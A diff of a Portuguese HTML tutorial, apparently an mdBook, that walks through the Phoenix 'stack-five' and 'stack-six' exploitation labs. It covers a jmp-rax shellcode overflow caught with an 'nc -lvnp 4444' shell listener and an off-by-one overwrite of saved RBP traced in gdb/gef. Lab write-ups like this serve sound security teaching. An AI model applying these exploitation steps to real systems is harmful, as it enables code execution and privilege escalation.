+<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada <code>ROPgadget</code></p>
 <pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
 Gadgets information
 ============================================================
@@ -1418,8 +1302,8 @@ Gadgets information
 Unique gadgets found: 1
 </code></pre>
 <p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
-<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endereço que rsp, e convenientemente o incio do nosso buffer
-<img src="stack/phoenix/./img/stack_five/gef_rax.png" alt="" /></p>
+<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endereço que rsp, e convenientemente o inicio do nosso buffer
+<img src="./img/stack_five/gef_rax.png" alt="" /></p>
 <p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
 <p>Assim, não vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
 <p>Só precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
@@ -1463,21 +1347,21 @@ open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
 <p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
 <p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
 <p>Terminal 1: <code>nc -lvnp 4444</code></p>
-<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
+<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
 <p>Agora, no terminal 1 deve ter uma shell :D</p>
-<p><img src="stack/phoenix/./img/stack_five/Exploit_working.png" alt="" /></p>
+<p><img src="./img/stack_five/Exploit_working.png" alt="" /></p>
 <blockquote>
-<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usavel</p>
+<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usável</p>
 </blockquote>
-<p>Se nos tivessemos executado o programa como root, a nossa shell teria esses privilegios elevados ! :D</p>
-<p><img src="stack/phoenix/./img/stack_five/root_exploit.png" alt="" /></p>
-<p><code>UID = 0</code> quer dizer que possuimos privilegios de root, mesmo que o <code>whoami</code> não tenha dito root</p>
-<p>E se o programa estivesse exposto para a rede, poderiamos conseguir uma root shell remota :D (spoiler para os proximos desafios hehehe)</p>
+<p>Se nos tivéssemos executado o programa como root, a nossa shell teria esses privilégios elevados ! :D</p>
+<p><img src="./img/stack_five/root_exploit.png" alt="" /></p>
+<p><code>UID = 0</code> quer dizer que possuímos privilégios de root, mesmo que o <code>whoami</code> não tenha dito root</p>
+<p>E se o programa estivesse exposto para a rede, poderíamos conseguir uma root shell remota :D (spoiler para os próximos desafios hehehe)</p>
 <hr />
 <p>Você chegou até aqui :D</p>
 <p>Toma mais um gif de panda como presente</p>
-<p><img src="stack/phoenix/./img/panda_slide_0.gif" alt="" /></p>
-<h1><a class="header" href="#-solução-5" id="-solução-5">💫 Solução</a></h1>
+<p><img src="./img/panda_slide_0.gif" alt="" /></p>
+<a class="header" href="print.html#-solução-5" id="-solução-5"><h1>💫 Solução</h1></a>
 <blockquote>
 <p>vim /tmp/gerar_exploit.py</p>
 </blockquote>
@@ -1502,15 +1386,15 @@ open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
 <p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
 <p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
 <p>Terminal 1: <code>nc -lvnp 4444</code></p>
-<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
+<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
 <p>Agora, no terminal 1 deve ter uma shell :D</p>
-<h1><a class="header" href="#-dicas-2" id="-dicas-2">💡 Dicas</a></h1>
+<a class="header" href="print.html#-dicas-2" id="-dicas-2"><h1>💡 Dicas</h1></a>
 <p>Off-by-one BOF</p>
-<h1><a class="header" href="#-explicação-4" id="-explicação-4">🛸 Explicação</a></h1>
-<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \ 
-Esse processo de gerar as mensagens é vulneravel a buffer overflow!</p>
-<h2><a class="header" href="#analisando-o-programa-1" id="analisando-o-programa-1">Analisando o programa</a></h2>
-<h3><a class="header" href="#main" id="main">main</a></h3>
+<a class="header" href="print.html#-explicação-4" id="-explicação-4"><h1>🛸 Explicação</h1></a>
+<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \
+Esse processo de gerar as mensagens é vulnerável a buffer overflow!</p>
+<a class="header" href="print.html#analisando-o-programa-1" id="analisando-o-programa-1"><h2>Analisando o programa</h2></a>
+<a class="header" href="print.html#main" id="main"><h3>main</h3></a>
 <pre><code class="language-C">int main(int argc, char **argv) {
   char *ptr;
   printf(&quot;%s\n&quot;, BANNER);
@@ -1534,36 +1418,36 @@ Esse processo de gerar as mensagens é vulneravel a buffer overflow!</p>
 }
 </code></pre>
 <p>Main começa definindo um pointer (<code>ptr</code>) e printando o banner</p>
-<p>Em seguida, faz verificaçõs relacionadas à arquitetura do sistema usando o diretivo:
-<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamda <code>NOME</code> existe.</p>
-<p>Isso é usado para tornar o incio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
-<p>Por isso nos não a encontramos no codigo fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binario:
-<img src="stack/phoenix/./img/stack_six/Messages_ARCH.png" alt="Diferença entre as arquiteturas" /></p>
+<p>Em seguida, faz verificações relacionadas à arquitetura do sistema usando o diretivo:
+<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamada <code>NOME</code> existe.</p>
+<p>Isso é usado para tornar o inicio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
+<p>Por isso nos não a encontramos no código fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binário:
+<img src="./img/stack_six/Messages_ARCH.png" alt="Diferença entre as arquiteturas" /></p>
 <p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
 <p>Depois, é checado se ptr é NULL (a env var não existe)</p>
-<p>Caso não exista: usa a função errx() para enterromper a execução com uma mensagem de erro! errx() recebe 2 argumento: (codigo_do_erro, mensagem_do_erro)</p>
+<p>Caso não exista: usa a função errx() para interromper a execução com uma mensagem de erro! errx() recebe 2 argumento: (código_do_erro, mensagem_do_erro)</p>
 <p>No nosso caso:</p>
 <pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
   if (NULL == ptr) {
     errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
   }
-    // Codigo de erro: 1
+    // Código de erro: 1
    // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
 </code></pre>
-<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o codigo retornado pelo ultimo programa
-<img src="stack/phoenix/./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
+<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o código retornado pelo ultimo programa
+<img src="./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
 <blockquote>
 <p>0 = sem erro, 1 = erro</p>
 </blockquote>
 <p>por ultimo, <code>greet()</code> é chamada, e o valor retornado por ela é printado!</p>
 <p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
-<h4><a class="header" href="#dica" id="dica">Dica</a></h4>
+<a class="header" href="print.html#dica" id="dica"><h4>Dica</h4></a>
 <p>Para definir uma env var no gdb</p>
-<p><img src="stack/phoenix/./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
+<p><img src="./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
 <blockquote>
 <p>set environment ExploitEducation=ABC</p>
 </blockquote>
-<h3><a class="header" href="#greet" id="greet">greet</a></h3>
+<a class="header" href="print.html#greet" id="greet"><h3>greet</h3></a>
 <pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
   char buffer[128];
   int maxSize;
@@ -1579,27 +1463,27 @@ Esse processo de gerar as mensagens é vulneravel a buffer overflow!</p>
   return strdup(buffer);
 }
 </code></pre>
-<p>Agora chega a parte vulneravel! D:</p>
+<p>Agora chega a parte vulnerável! D:</p>
 <p>A função <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
-<p>São definidas duas variaveis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho maximo)</p>
+<p>São definidas duas variáveis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho máximo)</p>
 <p>O tamanho de <code>who</code> é salvo em <code>maxSize</code></p>
 <blockquote>
 <p>Lembrete: Buffers são terminados com um NULL byte, portanto um buffer[128] só armazena 127 letras!</p>
 </blockquote>
 <p>Em seguida, é checado se <code>maxSize</code> é maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
-<p>Caso seja maior, <code>maxSize</code> vai ser denifido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
+<p>Caso seja maior, <code>maxSize</code> vai ser definido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
 <blockquote>
 <p>Portando, o limite de maxSize é 127</p>
 </blockquote>
 <p>Essa é uma tentativa de prevenir o buffer overflow! Pois, só seriam copiados 127 bytes, impedindo o overflow D:</p>
 <p>Mas aqui que entra o problema: essa contagem não leva em consideração o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
-<p>Então nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do codigo que causa a vulnerabilidade</p>
-<pre><code class="language-C">strcpy(buffer, what); // what = incio da mensagem
+<p>Então nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do código que causa a vulnerabilidade</p>
+<pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
 strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
 </code></pre>
-<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho! 
-Caso nos conseguissemos controlar what, poderiamos facilmente exploitar o programa)</p>
-<p>str <strong>N</strong> cpy (<code>strncpy</code>) é similar a <code>strcpy</code>, mas recebe um terceiro parametro: tamanho!</p>
+<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho!
+Caso nos conseguíssemos controlar what, poderíamos facilmente exploitar o programa)</p>
+<p>str <strong>N</strong> cpy (<code>strncpy</code>) é similar a <code>strcpy</code>, mas recebe um terceiro parâmetro: tamanho!</p>
 <p>Esse tamanho é limitado à 127 (limite de <code>maxSize</code>), então teoricamente não seria exploitavel :(</p>
 <p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
 <p>O tamanho do inicio é 34 bytes (na versão amd64)</p>
@@ -1611,8 +1495,8 @@ Caso nos conseguissemos controlar what, poderiamos facilmente exploitar o progra
 <p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
 <p>Então se não fosse pelo inicio da mensagem, não seria exploitavel :D</p>
 <p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
-<h2><a class="header" href="#analisando-o-programa-asm" id="analisando-o-programa-asm">Analisando o programa (ASM)</a></h2>
-<h3><a class="header" href="#main-1" id="main-1">main</a></h3>
+<a class="header" href="print.html#analisando-o-programa-asm" id="analisando-o-programa-asm"><h2>Analisando o programa (ASM)</h2></a>
+<a class="header" href="print.html#main-1" id="main-1"><h3>main</h3></a>
 <pre><code class="language-x86asm">gef&gt; disassemble main
 push   rbp
 mov    rbp,rsp                    ; Prologo
@@ -1631,7 +1515,7 @@ call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitE
 
 mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
 cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
-                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; tambem deveria funcionar,
+                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; também deveria funcionar,
                                   ; mas salvando nesse pointer, podemos usar o valor depois)
 
 jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a comparação anterior for diferente)
@@ -1642,7 +1526,7 @@ Essa parte só executa caso ExploitEducation não exista {
         mov    esi,0x4008d8               ; 2º argumento
         mov    edi,0x1                    ; 1º argumento
         mov    eax,0x0                    ; Valor retornado por main
-        call   0x400540 &lt;errx@plt&gt;        ; Enterrompe a execução e sai com erro
+        call   0x400540 &lt;errx@plt&gt;        ; Interrompe a execução e sai com erro
 }
 
 
@@ -1662,10 +1546,10 @@ mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
 leave                               ; Epilogo
 ret    
 </code></pre>
-<p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o codigo fonte!</p>
-<p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o codigo fonte por treino :D</p>
-<h2><a class="header" href="#fuzz" id="fuzz">Fuzz</a></h2>
-<p>Agora que sabemos que é possivel realizar o overflow, vamos ver o que é corrompido :D</p>
+<p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o código fonte!</p>
+<p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o código fonte por treino :D</p>
+<a class="header" href="print.html#fuzz" id="fuzz"><h2>Fuzz</h2></a>
+<p>Agora que sabemos que é possível realizar o overflow, vamos ver o que é corrompido :D</p>
 <p>Nos só podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: então <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
 <p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
 <pre><code class="language-x86asm">gef&gt; disassemble greet 
@@ -1681,15 +1565,15 @@ Dump of assembler code for function greet:
    0x000000000040079a &lt;+157&gt;:	ret    
 End of assembler dump
 </code></pre>
-<p>Vamos colocar uma no incio de greet e uma no final! :D</p>
+<p>Vamos colocar uma no inicio de greet e uma no final! :D</p>
 <pre><code class="language-x86asm">gef&gt; b *0x4006fe 
 Breakpoint 1 at 0x4006fe
 
 gef&gt; b *0x40079a
 Breakpoint 2 at 0x40079a
 </code></pre>
-<h2><a class="header" href="#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a></h2>
-<p>Obs: </p>
+<a class="header" href="print.html#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as"><h2>E vamos rodar com 127 As:</h2></a>
+<p>Obs:</p>
 <blockquote>
 <p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
 </blockquote>
@@ -1702,7 +1586,7 @@ Breakpoint 2 at 0x40079a
 <blockquote>
 <p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
 </blockquote>
-<p>eita, overflow no tutorial XD ! O computador ta se revoltando!! </p>
+<p>eita, overflow no tutorial XD ! O computador ta se revoltando!!</p>
 <p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
 <pre><code class="language-x86asm">gef&gt; info frame
 Stack level 0, frame at 0x7fffffffe590:
@@ -1722,10 +1606,10 @@ gef&gt; x/xg 0x7fffffffe588            -&gt; rip
 0x7fffffffe588:	0x00000000004007e9
 </code></pre>
 <blockquote>
-<p>Obs: o /xg é só para a formatação ficar legivel! Significa e<strong>X</strong>tra <strong>G</strong>rande (que é o tamanho do pointer na arquitetura amd64)!</p>
+<p>Obs: o /xg é só para a formatação ficar legível! Significa e<strong>X</strong>tra <strong>G</strong>rande (que é o tamanho do pointer na arquitetura amd64)!</p>
 </blockquote>
 <p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack são: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
-<p>Agora vamos continuar a execução <code>c</code>, e ver se eles se alteram (lembrando greet é vulneravel)!</p>
+<p>Agora vamos continuar a execução <code>c</code>, e ver se eles se alteram (lembrando greet é vulnerável)!</p>
 <pre><code class="language-x86asm">gef&gt; c
 ---- output do gef ----
 gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
@@ -1737,61 +1621,61 @@ gef&gt; x/xg 0x7fffffffe588             -&gt; rip
 <blockquote>
 <p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
 </blockquote>
-<p>Isso quer dizer que nós conseguimos controlar o ultimos byte do rbp salvo! Esse ultimo byte constuma ser 
+<p>Isso quer dizer que nós conseguimos controlar o últimos byte do rbp salvo! Esse ultimo byte constuma ser
 chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
 <p>Assim, quer dizer que esse buffer overflow é um <code>BoF</code> que corrompe o <code>LSB</code>, ou como é mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
 <p>Esse tipo de buffer overflow é bem comum: vão esquecer de que o buffer termina com um <code>0x00</code> e vão comparar o <code>input</code> com o <code>tamanho do buffer</code>,
-ao enves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
-<h4><a class="header" href="#curiosidade" id="curiosidade">Curiosidade</a></h4>
-<p>Lembra que o texto no inicio do buffer varia de arquitetura para aquitetura? Isso acontece pois cada uma aloca as variaveis em uma posição,
+ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
+<a class="header" href="print.html#curiosidade" id="curiosidade"><h4>Curiosidade</h4></a>
+<p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as variáveis em uma posição,
 otimizam de maneira diferente, etcetc!</p>
-<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não nescessariamente é o rbp! 
-E esse é o nosso caso: existem outras variaveis dentro de greet!</p>
+<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não necessariamente é o rbp!
+E esse é o nosso caso: existem outras variáveis dentro de greet!</p>
 <p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaço!</p>
-<p>Caso a mensagem fosse 1 byte maior, poderiamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiriamos controlar o rbp! </p>
-<p>E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderiamos controlar o RIP :D</p>
+<p>Caso a mensagem fosse 1 byte maior, poderíamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiríamos controlar o rbp!</p>
+<p>E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderíamos controlar o RIP :D</p>
 <p>...</p>
 <p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! É o caso do desafio passado!</p>
-<p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de codigo</strong></p>
-<p>Na vida real, caso não existisse essa mensagem, só conseguiriamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp, 
-isto é: não existe nenhuma outra variavel, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
-<pre><code>Nesse caso, nós nao conseguiriamos alterar RBP nem RIP,
-portanto seria impossivel conseguir execução de codigo :(
+<p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de código</strong></p>
+<p>Na vida real, caso não existisse essa mensagem, só conseguiríamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp,
+isto é: não existe nenhuma outra variável, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
+<pre><code>Nesse caso, nós nao conseguiríamos alterar RBP nem RIP,
+portanto seria impossível conseguir execução de código :(
 
-O maximo que conseguimos fazer é corromper 1 byte de uma varivel!
+O máximo que conseguimos fazer é corromper 1 byte de uma variável!
 ._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
-|    buffer      |   outras variaveis     | RBP | RIP | 
+|    buffer      |   outras variáveis     | RBP | RIP | 
 |_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|
 
 O impacto disso varia muito: não acontecer nada (mais comum), 
 fazer o programa crashar, ou alterar um valor importante 
-(por exemplo, aquela varivel poderia armazenar o seu saldo do banco hehe ;) )...
+(por exemplo, aquela variável poderia armazenar o seu saldo do banco hehe ;) )...
 </code></pre>
-<h2><a class="header" href="#como-ir-de-off-by-one-para-execução-de-codigo" id="como-ir-de-off-by-one-para-execução-de-codigo">Como ir de off-by-one para execução de codigo</a></h2>
+<a class="header" href="print.html#como-ir-de-off-by-one-para-execução-de-código" id="como-ir-de-off-by-one-para-execução-de-código"><h2>Como ir de off-by-one para execução de código</h2></a>
 <p>Quando <code>main</code> chama <code>call greet</code>, ela <code>salva o seu rbp e rip</code> na stack!</p>
 <p>Então esse rbp que estamos alterando é o <code>rbp de main</code>!</p>
 <p>Quando greet retorna, main fica com o rbp errado!</p>
 <p>Main vai ir ate o final da sua execução normalmente, na sua ultima instrução (<code>ret</code>) a magica acontece</p>
-<h3><a class="header" href="#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></h3>
+<a class="header" href="print.html#ret-com-um-rbp-corrompido" id="ret-com-um-rbp-corrompido"><h3>Ret com um RBP corrompido</h3></a>
 <p>resumindo, ret é um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, então +8)), e <code>pop rip</code></p>
 <p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
-<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para codigo que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
-<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>! 
+<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para código que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
+<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do <code>rbp</code>: vamos colocar 0x123456<strong>70</strong> (-8) no <code>rbp</code>!
 E quando main retornar, o <code>valor salvo</code> em 0x123456<strong>78</strong> vai para o <code>rip</code> !</p>
 <p>E se nos controlamos RIP, controlamos a execução :D</p>
-<h1><a class="header" href="#-exploit-3" id="-exploit-3">🔥 Exploit</a></h1>
+<a class="header" href="print.html#-exploit-3" id="-exploit-3"><h1>🔥 Exploit</h1></a>
 <p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
 <ol>
 <li>Descobrir que partes da memoria controlamos</li>
 <li>Encontrar para que região podemos apontar rbp</li>
 <li>Encontrar um pointer nessa região que aponte para a parte que controlamos</li>
 </ol>
-<h2><a class="header" href="#o-que-controlamos" id="o-que-controlamos">O que controlamos?</a></h2>
+<a class="header" href="print.html#o-que-controlamos" id="o-que-controlamos"><h2>O que controlamos?</h2></a>
 <p>Normalmente, nos controlamos o input e as env vars, nesse caso o input é passado pelas env vars... portanto podemos falar que a unica região da memoria que
 controlamos são as env vars</p>
 <p>E qual é essa região? Vamos encontrar :D</p>
-<h3><a class="header" href="#setup" id="setup">Setup</a></h3>
-<p>As envs são diferentes dentro do gdb, nós podemos comparar usando </p>
+<a class="header" href="print.html#setup" id="setup"><h3>Setup</h3></a>
+<p>As envs são diferentes dentro do gdb, nós podemos comparar usando</p>
 <pre><code>Fora do gdb: env
 Dentro do dbg: show environment
 </code></pre>
@@ -1811,19 +1695,19 @@ set environment _=/opt/phoenix/amd64/stack-six
 
 &gt; Aviso: Se você sair do gdb elas vão resetar!
 </code></pre>
-<h3><a class="header" href="#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></h3>
+<a class="header" href="print.html#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos"><h3>Descobrir que partes da memoria controlamos</h3></a>
 <p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
-<img src="stack/phoenix/./img/stack_six/envs_gef.png" alt="" /></p>
+<img src="./img/stack_six/envs_gef.png" alt="" /></p>
 <p>Escolhendo o menor endereço e printando!</p>
-<p><img src="stack/phoenix/./img/stack_six/envs_addr.png" alt="" /></p>
+<p><img src="./img/stack_six/envs_addr.png" alt="" /></p>
 <blockquote>
-<p>Dica: vale a pena conferir se aquele realmente é o incio das envs, no nosso caso é :D</p>
+<p>Dica: vale a pena conferir se aquele realmente é o inicio das envs, no nosso caso é :D</p>
 </blockquote>
-<p><img src="stack/phoenix/./img/stack_six/envs_addr2.png" alt="" /></p>
+<p><img src="./img/stack_six/envs_addr2.png" alt="" /></p>
 <p>Isso quer dizer que as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
-<h3><a class="header" href="#encontrar-para-que-região-podemos-apontar-rbp" id="encontrar-para-que-região-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></h3>
-<p>Nesse caso é facil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
-<h3><a class="header" href="#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></h3>
+<a class="header" href="print.html#encontrar-para-que-região-podemos-apontar-rbp" id="encontrar-para-que-região-podemos-apontar-rbp"><h3>Encontrar para que região podemos apontar rbp</h3></a>
+<p>Nesse caso é fácil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
+<a class="header" href="print.html#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos"><h3>Encontrar um pointer nessa região que aponte para a parte que controlamos</h3></a>
 <p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a região da memoria especificada!
 Voce vai estar &quot;assistindo&quot; aquela região da memoria! :D</p>
 <p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
@@ -1840,7 +1724,7 @@ Dump of assembler code for function main:
 gef&gt; b *0x00000000004007f7
 </code></pre>
 <p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
-<p><img src="stack/phoenix/./img/stack_six/memwatch.png" alt="memwatch" /></p>
+<p><img src="./img/stack_six/memwatch.png" alt="memwatch" /></p>
 <p>Eita, bastante coisa!</p>
 <p>Agora, entre esses endereços, precisamos encontrar um que tenha um <strong>pointer que aponte para a região da memoria que controlamos!</strong></p>
 <p>Pra facilitar isso, eu vou jogar todo o output do <code>memwatch</code> em um arquivo e usar <code>grep</code></p>
@@ -1863,7 +1747,7 @@ gef&gt; b *0x00000000004007f7
 ...
 </code></pre>
 <p>Isso reduz bastante, mas ainda não o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e não no endereço</p>
-<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos só levando os valores em consideração! Para facilitar, tambem podemos deixa-los em ordem crescente (sort)!</p>
+<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos só levando os valores em consideração! Para facilitar, também podemos deixa-los em ordem crescente (sort)!</p>
 <pre><code class="language-x86asm">$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
 0x00007fffffffe541
 0x00007fffffffe57f
@@ -1873,15 +1757,15 @@ gef&gt; b *0x00000000004007f7
 0x00007fffffffef10
 </code></pre>
 <p>as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
-<p>O unico valor valido é <strong>0x00007fffffffef10</strong>, pois todos os outros são menores que 0x00007fffffff<strong>e817</strong> !</p>
+<p>O único valor valido é <strong>0x00007fffffffef10</strong>, pois todos os outros são menores que 0x00007fffffff<strong>e817</strong> !</p>
 <p>Agora, basta achar o endereço desse pointer! Portanto vamos tirar o cut :D</p>
 <pre><code class="language-x86asm">$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
